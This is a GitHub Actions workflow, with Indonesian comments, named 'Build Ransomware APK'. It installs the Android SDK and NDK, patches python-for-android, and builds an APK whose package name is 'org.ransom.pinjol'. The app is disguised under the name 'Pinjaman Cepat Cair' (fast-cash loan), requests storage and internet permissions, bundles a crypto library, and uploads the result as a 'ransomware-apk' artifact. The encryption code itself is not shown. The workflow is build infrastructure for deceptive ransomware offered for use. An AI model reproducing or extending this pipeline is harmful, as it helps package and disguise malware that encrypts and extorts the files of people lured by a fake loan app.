name: Build Ransomware APK

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-22.04
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.9'

      - name: Set up Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            python3-pip \
            git \
            zip \
            unzip \
            wget \
            autoconf \
            libtool \
            pkg-config \
            cmake \
            libffi-dev \
            libssl-dev

      - name: Install Python dependencies (VERSI TERSEDIA)
        run: |
          pip install --upgrade pip
          pip install cython virtualenv
          pip install python-for-android==2023.9.16  # VERSI YANG TERSEDIA
          pip install pycryptodome requests kivy==2.1.0

      - name: Setup Android SDK
        run: |
          mkdir -p $HOME/android-sdk
          cd $HOME/android-sdk
          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
          unzip -q commandlinetools-linux-11076708_latest.zip
          mkdir -p cmdline-tools/latest
          mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
          
          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH

      - name: Download NDK r23b
        run: |
          mkdir -p $HOME/android-ndk
          cd $HOME
          wget -q https://dl.google.com/android/repository/android-ndk-r23b-linux.zip
          unzip -q android-ndk-r23b-linux.zip -d $HOME/android-ndk
          rm android-ndk-r23b-linux.zip
          echo "ANDROID_NDK_HOME=$HOME/android-ndk/android-ndk-r23b" >> $GITHUB_ENV

      - name: Accept Android licenses
        run: |
          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses || true

      - name: Install SDK components
        run: |
          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-31" "build-tools;31.0.0"

      - name: Patch p4a to accept NDK 23 (VERSI 2023.9.16)
        run: |
          SITE_PACKAGES=$(python -c "import site; print(site.getsitepackages()[0])")
          
          # Patch 1: android_ndk.py
          NDK_FILE="$SITE_PACKAGES/pythonforandroid/recipes/android_ndk.py"
          if [ -f "$NDK_FILE" ]; then
            echo "Patching $NDK_FILE"
            sed -i 's/if int(ndk_major_version) < min_ndk_major:/if False: # PATCHED - /' "$NDK_FILE"
          fi
          
          # Patch 2: bootstrap.py (untuk ALooper_pollAll)
          BOOT_FILE="$SITE_PACKAGES/pythonforandroid/bootstrap.py"
          if [ -f "$BOOT_FILE" ]; then
            echo "Patching $BOOT_FILE"
            sed -i 's/self.ndk_major_version = get_ndk_version(self.ctx.ndk_dir)/self.ndk_major_version = 23/g' "$BOOT_FILE"
          fi
          
          echo "✅ Patching selesai!"

      - name: Build APK (FORCE NDK 23)
        run: |
          p4a apk \
            --private . \
            --package=org.ransom.pinjol \
            --name="Pinjaman Cepat Cair" \
            --version=1.0 \
            --bootstrap=sdl2 \
            --requirements=python3,kivy==2.1.0,requests,pycryptodome \
            --permission INTERNET \
            --permission READ_EXTERNAL_STORAGE \
            --permission WRITE_EXTERNAL_STORAGE \
            --arch=arm64-v8a \
            --arch=armeabi-v7a \
            --sdk_dir=$ANDROID_HOME \
            --ndk_dir=$ANDROID_NDK_HOME \
            --android_api=31 \
            --minsdk=21 \
            --release \
            --ignore-setup-py \
            --debug || true

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: ransomware-apk
          path: ./*.apk
          if-no-files-found: warn